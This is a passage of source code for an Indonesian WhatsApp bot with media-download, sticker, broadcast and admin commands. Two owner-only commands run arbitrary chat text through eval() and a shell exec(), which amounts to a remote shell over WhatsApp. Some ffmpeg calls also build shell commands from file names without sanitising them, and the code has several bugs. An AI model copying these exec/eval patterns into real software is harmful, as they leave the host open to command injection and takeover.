//{"buttonId": `${prefix}dashboard`,"buttonText": {"displayText": `ᴅᴀsʜʙᴏᴀʀᴅ`},"type": "RESPONSE"}
//{"buttonId": `${prefix}sewa`,"buttonText": {"displayText": `sᴇᴡᴀ ʙᴏᴛᴢ`},"type": "RESPONSE"},
]

const muk = [

{urlButton: {
displayText: `Owner Bot`,
url: `https://wa.me/${nomerOwner}`
}},
{ quickReplyButton: { displayText: `ᴅᴀsʜʙᴏᴀʀᴅ`, id: `${prefix}dashboard` } },
{ quickReplyButton: { displayText: `𝕯𝖔𝖓𝖆𝖘𝖎`, id: `${prefix}donasi` } }

]

const templateButtons = [
{index: 1, urlButton: {displayText: '⭐ Star Baileys on GitHub!', url: 'https://github.com/adiwajshing/Baileys'}},
{index: 2, callButton: {displayText: 'Call me!', phoneNumber: '+1 (234) 5678-901'}},
{index: 3, quickReplyButton: {displayText: 'This is a reply, just like normal buttons!', id: 'id-like-buttons-message'}},
]

let options1 =
{forwardingScore: 50, 
isForwarded: true, 
externalAdReply: {
showAdAttribution: true,
title: fake,
body: copyright,
//description: 'Now Playing...',
mediaType: 1,
renderLargerThumbnail : true,
thumbnail: thumb,
sourceUrl: `https://wa.me/${nomerOwner}`
}
}
if(setmenu == "document"){
let dok = "https://tinyurl.com/29yvnsgq"
conn.sendButDoc(from, menunya,readmore+fiturnya,fs.readFileSync('./stik/thumbnaildokumen.jpg'), mok, {forwardingScore: 50, isForwarded: true,},{quoted: setQuoted})

} else if(setmenu == "location"){
conn.sendButLoc(from, menunya,"                      "+readmore+fiturnya+"\n"+copyright,fs.readFileSync('./stik/thumb.jpeg'), mok, options1)
} else if(setmenu == "image"){
conn.sendButImage(from, menunya, readmore+fiturnya, fs.readFileSync('./stik/thumb.jpeg'),mok)
} else if(setmenu == "image2"){
conn.send5ButImg (from, menunya+readmore+"\n"+fiturnya,copyright, fs.readFileSync('./stik/thumb.jpeg'), muk)
} else if(setmenu == "gif"){
conn.send5ButGif (from, menunya+readmore+"\n"+fiturnya,copyright, fs.readFileSync('./stik/video.mp4'), templateButtons,fs.readFileSync('./stik/fake gif.jpeg'),{quoted: m})
} else if(setmenu == "location2"){
conn.send5ButLoc(from, menunya+readmore+"\n"+fiturnya,copyright, fs.readFileSync('./stik/thumb.jpeg'), muk)
} else if(setmenu == "katalog"){
conn.sendKatalog(from, "ALL MENU BOT", menunya+readmore+"\n"+fiturnya, fs.readFileSync('./stik/thumb.jpeg'), {quoted: setQuoted})
}
}
case 'attp':
try {
if (args.length == 0) return setReply(`Example: ${prefix + command} Lana`)
await conn.sendMessage(from, {sticker: {url:`https://api.lolhuman.xyz/api/attp2?apikey=${apikey}&text=${encodeURI(q)}` }}, { quoted: m })
} catch (e) {
setReply(`Maap api error`)
}
break

case 'sewa':{
const { sewa } = (await import('./sewabot.js'))
}
break


case  'play':{
	if(!q) return setReply("Teksnya mana om")
	setReply(mess.wait)
	let rus = await yts(q)
	if(rus.all.length == "0") return setReply("Video tidak bisa di download")
	let data = await rus.all.filter(v => v.type == 'video')
	
	try{
	var res = data[0]
	var info = await ytdl.getInfo(res.url);
	} catch{
	var res = data[1]
	var info = await ytdl.getInfo(res.url);
	}
	
	let audio = ytdl.filterFormats(info.formats, 'audioonly');
  if(Number(audio[0].contentLength) > 100000000 ) return setReply(`Bjir sizenya ${FileSize(audio[0].contentLength)}\nAu ah ga mao download 😤`)
    
	let format = ytdl.chooseFormat(info.formats, { quality: '18' });
	
	try{
	var thumbnya =`https://i.ytimg.com/vi/${res.videoId}/hqdefault.jpg`
	} catch(err) {
	var thumbnya =`https://i.ytimg.com/vi/${res.videoId}/default.jpg`
	}
	
	let inithumb = await getBuffer(thumbnya)
	let options2 =
	{ 
	externalAdReply: {
	title: `⇆ㅤ ||◁ㅤ❚❚ㅤ▷||ㅤ ↻`, 
	body: `   ━━━━⬤──────────    click here to play music `,
	description: 'Now Playing...',
	mediaType: 1,
	renderLargerThumbnail : true,
	thumbnail: inithumb,
	mediaUrl: res.url,
	sourceUrl: res.url
	}
	}
	   
	var toks =`
	📂 Judul : ${res.title}
	🌐 Ditonton : ${h2k(res.views)} Kali 
	⏳ Durasi : ${res.timestamp}
	👤 Channel : ${res.author.name}
	🎧 Audio : ${FileSize(audio[0].contentLength)} 
	🎬 Video : ${FileSize(format.contentLength)}
  📎 Url : ${res.url}`
	
	let aklo = [
	{"buttonId": `${prefix}ytmp3 ${res.url} `,"buttonText": {"displayText": `ᴀᴜᴅɪᴏ`},"type": "RESPONSE"},
	{"buttonId": `${prefix}ytmp4 ${res.url}`,"buttonText": {"displayText": `ᴠɪᴅɪᴏ`},"type": "RESPONSE"}
	]

    downloadMp3(res.url) 
	//conn.sendButDoc(from, `*YOUTUBE DOWNLOADER*\n${toks}`, `© Bot WhatsApp`, null, aklo, options2)
	}
	break
/*
case 'play':{
if(!q) return setReply("Teksnya mana om")
setReply(mess.wait)
let rus = await yts(q)
if(rus.all.length == "0") return setReply("Video tidak bisa di download")
let data = await rus.all.filter(v => v.type == 'video')

try{
var res = data[0]
var info = await ytdl.getInfo(res.url);
} catch{
var res = data[1]
var info = await ytdl.getInfo(res.url);
}

let audio = ytdl.filterFormats(info.formats, 'audioonly');
let format = ytdl.chooseFormat(info.formats, { quality: '18' });

try{
var thumbnya =`https://i.ytimg.com/vi/${res.videoId}/hqdefault.jpg`
} catch(err) {
var thumbnya =`https://i.ytimg.com/vi/${res.videoId}/default.jpg`
}

let inithumb = await getBuffer(thumbnya)
let options2 =
{
externalAdReply: {
title: `⇆ㅤ ||◁ㅤ❚❚ㅤ▷||ㅤ ↻`,
body: `   ━━━━⬤──────────    click here to play music `,
description: 'Now Playing...',
mediaType: 1,
renderLargerThumbnail : true,
thumbnail: inithumb,
mediaUrl: res.url,
sourceUrl: res.url
}
}



var toks =`
📂 Judul : ${res.title}
🌐 Ditonton : ${h2k(res.views)} Kali
⏳ Durasi : ${res.timestamp}
👤 Channel : ${res.author.name}
🎧 Audio : ${FileSize(audio[0].contentLength)}
🎬 Video : ${FileSize(format.contentLength)}`

let aklo = [
{"buttonId": `${prefix}playmp3 ${res.url} `,"buttonText": {"displayText": `ᴀᴜᴅɪᴏ`},"type": "RESPONSE"},
{"buttonId": `${prefix}playmp4 ${res.url}`,"buttonText": {"displayText": `ᴠɪᴅɪᴏ`},"type": "RESPONSE"}
]
conn.sendButDoc(from, `*YOUTUBE DOWNLOADER*\n${toks}`, `© LANA DEV`, null, aklo, options2)
}
break
    */
case 'kiss':case 'bite':case 'yeet':case 'neko':case 'bully':case 'bonk':case 'wink':case 'poke':case 'nom':case 'slap':case 'smile':case 'wave':case 'awoo':case 'blush':case 'smug':case 'glomp':case 'happy':case 'dance':case 'cringe':case 'cuddle':case 'highfive':case 'shinobu':case 'megumin':case 'handhold':
axios.get(`https://api.waifu.pics/sfw/${command}`)
.then(({data}) => {
	conn.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
break
    //========================//

// SCRIPT BY : LANA DEV
// EROR?? WA : 085773089737
// JANGAN DI HAPUS ASU
// JUAL SCRIPT NERAKA PALING BAWAH

//===================//
  case 'sbg':
    setReply(`bang`)
    break
    
case 's':
case   'sticker':
if (isImage || isQuotedImage || isVideo || isQuotedVideo) {
if (quoted.seconds > 11) return m.reply('Maksimal 10 detik!')
let kualitas = isImage? 70 : 2
let { Sticker, createSticker, StickerTypes } = require('wa-sticker-formatter')
let media = await conn.downloadAndSaveMediaMessage(quoted,makeid(5))
let jancok = new Sticker(media, {
pack: packName, // The pack name
author: authorName, // The author name
type: StickerTypes.FULL, // The sticker type
categories: ['🤩', '🎉'], // The sticker category
id: '12345', // The sticker id
quality: kualitas, // The quality of the output file
background: '#FFFFFF00' // The sticker background color (only for full stickers)
})
let stok = getRandom(".webp")
let nono = await jancok.toFile(stok)
let nah = fs.readFileSync(nono)
await conn.sendMessage(from,{sticker: nah},{quoted: m})
await fs.unlinkSync(stok)
await fs.unlinkSync(media)
} else {
setReply(`Kirim gambar/vidio dengan caption ${command} atau balas gambar/vidio yang sudah dikirim\nNote : Maximal vidio 10 detik!`)
}
break
    
case 'speed':
setReply(`Speed: ${latensi.toFixed(4)} Second`)
break   
		   
case 'runtime':{
let data = global.db.data.others['runtime']
let time = (new Date - data.runtime) || 'lamanya'
let teks =`
🕦 System aktif selama ${runtime(process.uptime())}
⏰ Bot aktif selama ${clockString(time)}
`
setReply(teks)
}
break
    
    
case 'ss':
if(!q) return setReply("Masukan Link")
if(!isUrl(args[0]) && !args[0].includes('www.')) return reply("Link error");
let Url = `https://api.apiflash.com/v1/urltoimage?access_key=${apiflash}&wait_until=page_loaded&url=${q}`
conn.sendMessage(from,{image:{url: Url},caption:"Nih"},{quoted:m})
break  
  
//Eval.code
case '>': {
if (!isOwner) return setReply(mess.only.owner)
try {
let evaled = await eval(q)
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
m.reply(evaled)
} catch (err) {
m.reply(String(err))
}
}
break
case 'ping':{
const used = process.memoryUsage()
let timestamp = speed()
let latensi = speed() - timestamp
let neww = performance.now()
let oldd = performance.now()
let respon = `Kecepatan Respon ${latensi.toFixed(4)} _Second_ 

_Info Server_
RAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}

_NodeJS Memory Usaage_
${Object.keys(used).map((key, _, arr) => `${key.padEnd(Math.max(...arr.map(v=>v.length)),' ')}: ${formatp(used[key])}`).join('\n')}
`.trim()
conn.relayMessage(from, { liveLocationMessage: { 
degreesLatitude: 35.676570,
degreesLongitude: 139.762148,
caption: respon,
sequenceNumber: 1656662972682001, timeOffset: 8600, jpegThumbnail: fs.readFileSync('./stik/reply.jpg'),
contextInfo: {
mentionedJid: [m.sender],
externalAdReply: {
showAdAttribution: true,
}
}
}} , { quoted: m })
}
break
case 'toptt':
if (isQuotedAudio){
setReply(mess.wait)
let media = await conn.downloadAndSaveMediaMessage(quoted,makeid(5))
let ran = getRandom('.mp3')
exec(`ffmpeg -i ${media} ${ran}`, async (err) => {
fs.unlinkSync(media)
if (err) return setReply('Gagal mengkonversi audio ke ptt')
let topt = fs.readFileSync(ran)
await conn.sendMessage(from,{audio: topt, mimetype: 'audio/mp4', ptt:true}, {quoted: m})
fs.unlinkSync(ran)
})
} else {
setReply("Reply audio")
}
break
case  'playmp3':
if(!isUrl) return setReply("Masukan link")
try{
setReply("*Downloading...*")
let info = await ytdl.getInfo(q);
let audioFormats = ytdl.filterFormats(info.formats, 'audioonly');
try{
var low = audioFormats[2].contentLength
} catch (err){
var low = audioFormats[0].contentLength
}
if(Number(low) > 15000000 ) return setReply(`Bjir sizenya ${FileSize(low)}\nAu ah ga mao download 😤`)
if(audioFormats[0].contentLength == "undefined"){
var rus = await yts(q)
var data = await rus.all.filter(v => v.type == 'video')
var res = data[0]	
if(res.timestamp.split(":") > "10") return setReply("Tidak bisa mendownload audio lebih dari 10 menit")
}
downloadMp3(q) 
} catch (err){
console.log(err)
}
break

case 'owner':{
					conn.sendKontak(from, global.nomerOwner, global.ownerName)
				}
				break
    
case  'playmp4':{
if(!isUrl) return setReply("Masukan link")
let info = await ytdl.getInfo(q);
let format = ytdl.chooseFormat(info.formats, { quality: '18' });
if(Number(format.contentLength) > 40000000 ) return setReply(`Bjir sizenya ${FileSize(format.contentLength)}\nAu ah ga mao download 😤`)
if(format.contentLength == "undefined"){
var rus = await yts(q)
var data = await rus.all.filter(v => v.type == 'video')
var res = data[0]
if(res.timestamp.split(":") > "10") return setReply("Tidak bisa mendownload video lebih dari 10 menit")
}
setReply("*Downloading...*")
downloadMp4 (q) 
}
break   


case  'bcgc':{
if (!isOwner && !itsMe) return onlyOwner()
if (!q) return setReply('Teksnya?')
let getGroups = await conn.groupFetchAllParticipating()
let groupss = Object.entries(getGroups).slice(0).map(entry => entry[1])
let anus = groupss.map(v => v.id)
let data = global.db.data.others['runtime']
let time = (new Date - data.runtime) || "Tidak terdeteksi" 
setReply(`Mengirim Broadcast Ke ${anus.length} Chat, Waktu Selesai ${anus.length * 0.5 } detik`)
let yesnih = [
{"buttonId": `${prefix}menu`,"buttonText": {"displayText": `ᴍᴇɴᴜ`},"type": "RESPONSE"},
{"buttonId": `SEWA BOTZ`,"buttonText": {"displayText": `sᴇᴡᴀ ʙᴏᴛᴢ`},"type": "RESPONSE"}]

let muk = [{urlButton: {displayText: `Sewa`,url: `https://wa.me/p/8960486383991478/6285811965686`}}]
let teks = `*BROADCAST GROUP*\n\n${q}`

if (isImage || isQuotedImage) { //Image
let buff = await conn.downloadAndSaveMediaMessage(quoted,makeid(5))
//let buffer = fs.readFileSync(file)
for (let i of anus) {
await sleep(1000)
await conn.sendMessage(i, {caption: teks, image: fs.readFileSync(buff)}, { quoted: ftroli})
}
fs.unlinkSync(buff)
} else  if (isVideo || isQuotedVideo) { //Video
let buff = await conn.downloadAndSaveMediaMessage(quoted,makeid(5))
for (let i of anus) {
await sleep(1000)
await conn.sendMessage(i, {caption: teks, video: buff}, { quoted: ftroli})
}
fs.unlinkSync(buff)
} else if (isAudio || isQuotedAudio) { //Audio
let buff = await conn.downloadAndSaveMediaMessage(quoted,makeid(5))
for (let i of anus) {
await sleep(1000)
await conn.sendMessage(i, {caption: teks, audio: fs.readFileSync(buff)}, { quoted: m})
}
fs.unlinkSync(buff)
} else {
for (let i of anus) {
let toks = `${q}`

await sleep(1000)
await conn.sendMessage(i, { text : toks } ) 
}
}
setReply(`Sukses Mengirim Broadcast Ke ${anus.length} Group`)
}
break



    
/*
case  'bcgc':{
if (!isOwner && !itsMe) return onlyOwner()
if (!q) return setReply('Teksnya?')
let getGroups = await conn.groupFetchAllParticipating()
let groupss = Object.entries(getGroups).slice(0).map(entry => entry[1])
let anus = groupss.map(v => v.id)
let data = global.db.data.others['runtime']
let time = (new Date - data.runtime) || "Tidak terdeteksi" 
setReply(`Mengirim Broadcast Ke ${anus.length} Chat, Waktu Selesai ${anus.length * 0.5 } detik`)
let yesnih = [
{"buttonId": `${prefix}menu`,"buttonText": {"displayText": `ᴍᴇɴᴜ`},"type": "RESPONSE"},
{"buttonId": `SEWA BOTZ`,"buttonText": {"displayText": `sᴇᴡᴀ ʙᴏᴛᴢ`},"type": "RESPONSE"}]

let muk = [{urlButton: {displayText: `Sewa`,url: `https://wa.me/p/8960486383991478/6285811965686`}}]
let teks = `*BROADCAST GROUP*\n\n${q}`

if (isImage || isQuotedImage) { //Image
let buff = await conn.downloadAndSaveMediaMessage(quoted,makeid(5))
//let buffer = fs.readFileSync(file)
for (let i of anus) {
await sleep(1000)
await conn.sendMessage(i, {caption: teks, image: fs.readFileSync(buff)}, { quoted: ftroli})
}
fs.unlinkSync(buff)
} else  if (isVideo || isQuotedVideo) { //Video
let buff = await conn.downloadAndSaveMediaMessage(quoted,makeid(5))
for (let i of anus) {
await sleep(1000)
await conn.sendMessage(i, {caption: teks, video: buff}, { quoted: ftroli})
}
fs.unlinkSync(buff)
} else if (isAudio || isQuotedAudio) { //Audio
let buff = await conn.downloadAndSaveMediaMessage(quoted,makeid(5))
for (let i of anus) {
await sleep(1000)
await conn.sendMessage(i, {caption: teks, audio: fs.readFileSync(buff)}, { quoted: m})
}
fs.unlinkSync(buff)
} else {
for (let i of anus) {
let toks = `${q}`

await sleep(1000)
await conn.sendMessage(i, { text : toks } ) 
}
}
setReply(`Sukses Mengirim Broadcast Ke ${anus.length} Group`)
}
break

    */
case 'public':
if (!isOwner) return onlyOwner()
if (publik) return setReply('Udah di mode publick kak')
publik = true
let bab =`Mode public aktif kak`
setReply(bab)
break
			   
case 'self':
if (!isOwner) return onlyOwner()
if (publik == false) return setReply('Udah di mode self kak')
publik = false
let breh =`Mode self aktif kak`
setReply(breh)
break


case '$':{
if (!itsMe && !isOwner) return onlyOwner()
await setReply("_Executing..._")
exec(q, async (err, stdout) => {
if (err) return setReply(`${copyright}:~ ${err}`)
if (stdout) {
await setReply(`*>_ Console*\n\n${stdout}`)
}
})
}
break

case 'banchat':{
if (!isOwner) return onlyOwner()
if (!isGroup) return setReply(mess.only.group)
if (isBanchat) return setReply(`udah di ban`)
db.data.chats[from].banchat = true
setReply(`Bot berhasil Ban di group ini`)
}
break




case 'fb':{ 
if (!args[0]) return setReply('Putting *URL* Facebook..')
//if (!args[0].includes("facebook")) return setReply(`Url is wrong..\n\n*Example:*\n${prefix}fb https://www.facebook.com/juankcortavarriaoficial/videos/218237676749570/`)
let res = await _scrape.snapsave(q)
setReply('Sedang diproses...')
await conn.sendMedia (from, res.videoUrl, m, {caption: "Nih"})
}
break

		
case 'ig': 
case   'instagram':{
try{
if(!q) return setReply("Masukan Link")
setReply(mess.wait)
if (!args[0].match(/https:\/\/www.instagram.com\/(p|reel|tv)/gi)) return setReply( `*Link salah! Perintah ini untuk mengunduh postingan ig/reel/tv, bukan untuk highlight/story!*\n\ncontoh:\n${prefix + command} https://www.instagram.com/p/BmjK1KOD_UG/?utm_medium=copy_link`)
const {instagramdlv3} = await import("@bochilteam/scraper")
let igreel = q.includes("https://www.instagram.com/reel/")
let results = await instagramdlv3(args[0])
for (const { url } of results) await conn.sendMedia(from, url, m, {caption: "*╌╌「 SUCCES 」╌╌*"})
} catch(err){
const instagramGetUrl = require('instagram-url-direct')
const results = (await instagramGetUrl(args[0])).url_list[0]
conn.sendFile(m.chat, results, 'instagram.mp4', `*INSTAGRAM DOWNLOADER*`, m)
}
}
break

case 'restart':{
if (!isOwner && !itsMe) return setReply(mess.only.owner)
await conn.sendMessage(from, {text: `_Restarting ${fake}_`})
await conn.sendMessage(from, {text: "_Succes_"})
await sleep(1000)
process.send('reset') 
}
break
	

case 'tiktoknowm': 
case 'tiktok':{ 
if (args.length < 1) return setReply('Link?')
if (!isUrl(args[0]) && !args[0].includes('tiktok.com')) return setReply("Error link")
if(q.startsWith("https://vt.tiktok.com/")){
var lin = args[0]
} else if(q.startsWith("https://vm.tiktok.com/")){
var lin = args[0]
} else if(q.startsWith("https://www.tiktok.com/")){
var lin = args[0]
} else {
return setReply("Masukan link tikok, contoh https://vt.tiktok.com/")
}
setReply(mess.wait)
const {tiktokdlv2} = await import('@bochilteam/scraper')
tiktokdlv2(lin).then(res => {
let ep = res.video.no_watermark
conn.sendMessage(from, {caption: "Nih", video: {url: ep}},{quoted: m})
})
}
break


case 'twitter': {
if (!q) throw 'Input URL'
async function twitterDl(url) {
let id = /twitter\.com\/[^/]+\/status\/(\d+)/.exec(url)[1]
if (!id) throw 'Invalid URL'
let res = await fetch(`https://tweetpik.com/api/tweets/${id}`)
if (res.status !== 200) throw res.statusText
let json = await res.json()
if (json.media) {
let media = []
for (let i of json.media) {
if (/video|animated_gif/.test(i.type)) {
let vid = await (await fetch(`https://tweetpik.com/api/tweets/${id}/video`)).json()
vid = vid.variants.pop()
media.push({
url: vid.url,
type: i.type
})
} else {
media.push({
url: i.url,
type: i.type
})
}
}
return {
caption: json.text,
media 
}
} else throw 'No media found'
}
	
	
let res = await twitterDl(q)
await m.reply('_In progress, please wait..._')
for (let x = 0; x < res.media.length; x++) {
let caption = x === 0 ? res.caption.replace(/https:\/\/t.co\/[a-zA-Z0-9]+/gi, '').trim() : ''
//conn.sendFile(m.chat, res.media[x].url, '', caption, m)
conn.sendMedia(from, res.media[x].url, m, {caption: caption})
}
}
break


case 'sfile': {
async function sfileSearch(query, page = 1) {
let res = await fetch(`https://sfile.mobi/search.php?q=${query}&page=${page}`)
let $ = cheerio.load(await res.text())
let result = []
$('div.list').each(function () {
let title = $(this).find('a').text()
let size = $(this).text().trim().split('(')[1]
let link = $(this).find('a').attr('href')
if (link) result.push({ title, size: size.replace(')', ''), link })
})
return result
}
	
async function sfileDl(url) {
let res = await fetch(url)
let $ = cheerio.load(await res.text())
let filename = $('div.w3-row-padding').find('img').attr('alt')
let mimetype = $('div.list').text().split(' - ')[1].split('\n')[0]
let filesize = $('#download').text().replace(/Download File/g, '').replace(/\(|\)/g, '').trim()
let download = $('#download').attr('href') + '&k=' + Math.floor(Math.random() * (15 - 10 + 1) + 10)
return { filename, filesize, mimetype, download }
}
		
if (q.match(/(https:\/\/sfile.mobi\/)/gi)) {
let res = await sfileDl(q)
if (!res) return setReply('Error :/')
await setReply(Object.keys(res).map(v => `*• ${v}:* ${res[v]}`).join('\n') + '\n\n_Sending file..._')
conn.sendMessage(m.chat, { document: { url: res.download }, fileName: res.filename, mimetype: res.mimetype }, { quoted: m })
} else if (q) {
let [query, page] = q.split`|`
let res = await sfileSearch(query, page)
if (!res.length) return setReply( `Query "${text}" not found :/`)
let rus = res.map((v) => `*Title:* ${v.title}\n*Size:* ${v.size}\n*Link:* ${v.link}`).join`\n\n`
setReply(rus)
} else return setReply( 'Input Query / Sfile Url!')
}
break
    
//========================//

// SCRIPT BY : LANA DEV
// EROR?? WA : 085773089737
// JANGAN DI HAPUS ASU
// JUAL SCRIPT NERAKA PALING BAWAH

//===================//
case 'zippy':{
let { extract } = await import( 'zs-extract')
let { lookup } =  await import( 'mime-types')
if (!args[0]) return setReply(`Masukkan URL zippyshare yang ingin didownload.\n\nContoh: ${prefix + command} https://www83.zippyshare.com/v/wD7mX1i0/file.html`)
if (!args[0].includes('zippyshare.com')) return setReppy( 'Invalid URL!\nPastikan URL merupakan URL zippyshare.')
setReply(mess.wait)
for (let i = 0; i < args.length; i++) {
if (!args[i].includes('zippyshare.com/v')) continue
let res = await extract(args[i])
let mimetype = await lookup(res.download)
conn.sendMessage(m.chat, { document: { url: res.download }, fileName: res.filename, mimetype }, { quoted: m })
}
}
break


case 'song': {
if (q === 'help') {
return m.reply(`*❗Command:* ${command}\n*🧩Category:* Search\n*🛠️Usage:* ${prefix + command} back in black\n\n*📚Description:* Sends song in Whatsapp `)
}
if (!args.join(" ")) return m.reply(`Example : ${prefix + command} Back in black`)
let search = await yts(q)
let listSerch = []
let teskd = `\n📂Result From *${args.join(" ")}*.\n\n*Select any Song🎵*`
for (let i of search.all) {
listSerch.push({
title: i.title,
rowId: `${prefix}playmp3 ${i.url}`,
description: `Author : ${i.author.name} / ${i.timestamp}`
})
}
const sections = [
{
title: "Total Search🔍" + search.all.length,
rows: listSerch
}
]
const listMessage = {
text: teskd,
footer: copyright,
title: `*📂Youtube Search by ${copyright} MD*`,
buttonText: "List",
sections
}
conn.sendMessage(from, listMessage, {quoted: m})
}
break

    
case 'setppbot':{
if (!isOwner) return setReply(mess.only.owner)
if (isImage || isQuotedImage) {
if(q == 'full'){
const media = await conn.downloadAndSaveMediaMessage(quoted,makeid(5))
const { img } = await generateProfilePicture(media)
await conn.query({ tag: 'iq',  attrs: { to: botNumber, type:'set', xmlns: 'w:profile:picture'}, content: [{ tag: 'picture', attrs: { type: 'image' }, content: img }]})       
await setReply("Sukses")    
} else{
let media = await conn.downloadAndSaveMediaMessage(quoted,makeid(5))
let data =  await conn.updateProfilePicture(botNumber, { url: media })
fs.unlinkSync(media)
setReply(`Sukses`)
}
} else  {
setReply(`Kirim/balas gambar dengan caption ${command} untuk mengubah foto profil bot`)
}
}
break

//========================//

// SCRIPT BY : LANA DEV
// EROR?? WA : 085773089737
// JANGAN DI HAPUS ASU
// JUAL SCRIPT NERAKA PALING BAWAH

//===================//
case 'join':{
if(!isOwner) return setReply(mess.only.owner)
let link = q.startsWith("http")
if(!link) return setReply(`Kirim perintah ${command} _linkgrup_`)
let Url = args[1]
let ano = q.split('https://chat.whatsapp.com/')[1]
await conn.groupAcceptInvite(ano)
setReply("Sukses join group")
}
break


case 'bcgc':{
if (!isOwner && !itsMe) return onlyOwner()
if (!q) return setReply('Teksnya?')
let getGroups = await conn.groupFetchAllParticipating()
let groupss = Object.entries(getGroups).slice(0).map(entry => entry[1])
let anus = groupss.map(v => v.id)
setReply(`Mengirim Broadcast Ke ${anus.length} Chat, Waktu Selesai ${anus.length * 0.5 } detik`)
let yesnih = [{"buttonId": `${prefix}menu`,"buttonText": {"displayText": `ᴍᴇɴᴜ`},"type": "RESPONSE"},
                        {"buttonId": `SEWA BOTZ`,"buttonText": {"displayText": `sᴇᴡᴀ ʙᴏᴛ`},"type": "RESPONSE"}]
let muk = [{urlButton: {displayText: `ORDER`,url: `https://wa.me/p/5494819543894101/6285773089737`}}]
let teks = `*BROADCAST GROUP*\n\n${q}`

for (let i of anus) {
let toks = `┏━ ❮❮ 𝙼𝙴𝚂𝚂𝙴𝙶𝙴 ❯❯
┣❲  ${q}
┖─┅┈⸔⸔⬫
┏┬┬┬┬┬┬┬┬┬┬┬┬┬⁛⸙⸙
┃⫹⫺ 𝚁𝚞𝚗𝚝𝚒𝚖𝚎 : ${runtime(process.uptime())}
┃⫹⫺ 𝙳𝚊𝚝𝚎 : ${calender}
┃⫹⫺ 𝚝𝚒𝚖𝚎 :${moment().tz('Asia/Jakarta').format('HH:mm:ss')}
┖──┈┈┈〠⸙࿉༐`
let teks2 = "*_Broadcast Group_*"
await sleep(1000)
await conn.send5ButLoc(i, teks2, q, fs.readFileSync('./stik/bc.jpg'),  muk) 
}
setReply(`Sukses Mengirim Broadcast Ke ${anus.length} Group`)
}
break


case 'listgc': {
if(!isOwner) return setReply(mess.only.owner)
let getGroups = await conn.groupFetchAllParticipating()
 //console.log(getGroups)
let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
let anu = groups.map(v => v.id)
let teks = `⬣ *LIST GROUP CHAT*\n\nTotal Group : ${anu.length} Group\n\n`
for (let i of anu) {
let metadata2 = await conn.groupMetadata(i)
teks += `◉ Nama : ${metadata2.subject}\n◉ Owner : ${metadata2.owner !== undefined ? '@' + metadata2.owner.split`@`[0] : 'Tidak diketahui'}\n◉ ID : ${metadata2.id}\n◉ Dibuat : ${moment(metadata2.creation * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss')}\n◉ Member : ${metadata2.participants.length}\n\n────────────────────────\n\n`
 }
conn.sendTextWithMentions(from, teks, m)
}
break


case 'tomp3':
if (isQuotedVideo || isVideo) {
setReply(mess.wait)
let media = await conn.downloadAndSaveMediaMessage(quoted,makeid(5))
let ran = getRandom('.mp3')
exec(`ffmpeg -i ${media} -vn ${ran}`, async (err) => {
fs.unlinkSync(media)
if (err) return setReply(`Err: ${err}`)
let buffer453 = fs.readFileSync(ran)
await conn.sendMessage(from, {mimetype: 'audio/mp4', audio: buffer453}, { quoted: m })
fs.unlinkSync(run)
})
} else {
setReply("Reply videonya")
}
break


case 'mediafire':{
if(!q) return setReply("masukan link")
const {mediafiredl} = require('@bochilteam/scraper')
if(q.startsWith("https://www.mediafire.com")){
let nana = await mediafiredl(q)
if(nana.filename == "") return setReply("Error itu bukan file, kalo ga tau cara make mediafire mending ga usah make") 
console.log(nana)
let tuks =`
Data succesfull obtained
	
File Name : ${nana.filename}
File Size : ${nana.filesizeH}
Upload : ${nana.aploud}
`
await setReply(tuks)
if(nana.filesize > 90000 && !isOwner){
if(sender.startsWith("62")){
let tukss = "Kamu telah di banned\nkarena menyalah gunakan\nfitur mediafire!"
let alasan = "Menyalahgunakan fitur mediafire"
_ban.add(pushname,calender,senderNumber,alasan,ban)
await setReply("File size melebihi batas,\nbatas yang di tentukan adalah 90mb")              
await setReply(tukss)
return
}
await conn.sendMedia (from, nana.url, m, {fileName: nana.filename})
} else{
setReply("Link Invalid")
}
}
}
break

case 'delsampah':{
let directoryPath = path.join();
fs.readdir(directoryPath, async function (err, files) {
if (err) {
console.log('Unable to scan directory: ' + err);
return setReply('Unable to scan directory: ' + err);
} 
let filteredArray = await files.filter(item => item.endsWith("gif") || item.endsWith("png") || item.endsWith("mp3")  || item.endsWith("mp4") || item.endsWith("jpg") ||item.endsWith("webp") ||item.endsWith("webm")   )
console.log(filteredArray.length); 
let teks =`Terdeteksi ${filteredArray.length} file sampah\n\n`
if(filteredArray.length == 0) return setReply(teks)
filteredArray.map(function(e, i){
teks += (i+1)+`. ${e}\n`
})     
setReply(teks) 
await sleep(2000)
setReply("Menghapus file sampah...")
await filteredArray.forEach(function (file) {
fs.unlinkSync(file)
});
await sleep(2000)
setReply("Berhasil menghapus semua sampah")     
});
}
break  


case 'dashboard':{
//const d = (await import("lowdb")).default;
const getFolderSize = (await import("get-folder-size")).default;
let storage = await getFolderSize.loose('.');
let moduls = await getFolderSize.loose('./node_modules');
let session = await getFolderSize.loose('./session')
let databse = await getFolderSize.strict('./database/database.json');
for (let i of hitnya){
let cekvipp = ms(i.expired - Date.now())
var resetnye = `${cekvipp.hours} jam ${cekvipp.minutes} menit`             
	 } 
	 
let teks =`
*Dashboard*     
Runtime : ${runtime(process.uptime())}
Reset : ${resetnye}
Total Hit : ${thisHit.toLocaleString()}
	
*Storage*
Internal : ${FileSize(storage)}
Modules : ${FileSize(moduls)}
Session : ${FileSize(session)}
Database : ${FileSize(databse)}
`
let fall ="*Commands Today*  \n"
let totalFail =[]
let totalSuc = []
let total = 0
let tot = 0
await dash.map(async function(e, i){
fall += "*•*"+` ${e.cmd} : ${e.succes+e.failed} \n`   
await totalFail.push(e.failed)
await totalSuc.push(e.succes)
});
		 
for(let i = 0; i < totalFail.length; i++){
total += totalFail[i]
} 
	
for(let a = 0; a < totalSuc.length; a++){
tot += totalSuc[a]
} 
	 
let akoh = `Total : ${dash.length} used`
let tod ="*Command Failed*\n"
let filteredArray = await dash.filter(item => item.failed > 0 )
await filteredArray.map(async function(e, i){
tod += "*•*"+` ${e.cmd} : ${e.failed} \n`   
	
});
let aw = `Total : ${filteredArray.length} failed`    
let tekz = teks+"\n\n"+fall+"\n"+akoh+"\n\n"+"*Command Status* \n"+" *•* Succes : "+tot+"\n"+" *•* Failed : "+total+"\n\n"+tod+"\n\n"
setReply(tekz)                                                        
}
break


case 'gitclone':
try{
